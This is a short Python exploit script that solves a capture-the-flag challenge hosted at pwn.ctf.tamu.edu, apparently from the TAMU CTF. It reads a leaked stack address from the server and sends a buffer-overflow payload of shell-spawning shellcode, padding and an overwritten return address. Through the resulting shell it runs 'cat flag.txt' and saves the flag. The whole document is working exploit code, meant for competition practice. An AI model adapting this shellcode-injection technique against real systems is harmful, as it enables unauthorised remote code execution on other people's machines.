# https://ctftime.org/task/5397
from pwn import *
from zio import *
import re

flag_pattern = r"gigem{.+?}"
shellcode = asm(shellcraft.sh())
off_s = -0xEE
off_ret = 4
junk = 'a'
var_addr_s_pattern = "[0-9a-f]{8}"
server = "pwn.ctf.tamu.edu", 4323
io = zio(server, print_read=False, print_write=False)
content = io.read_until_re(var_addr_s_pattern)
var_addr_s = int(re.search(var_addr_s_pattern, content).group(), 16)
payload = shellcode + (off_ret - off_s - len(shellcode)) * junk + l32(var_addr_s)
io.writeline(payload)
io.writeline("cat flag.txt")
content = io.read_until_re(flag_pattern)
flag = re.search(flag_pattern, content).group()
with open('flag', 'wb') as f:
	f.write(flag)
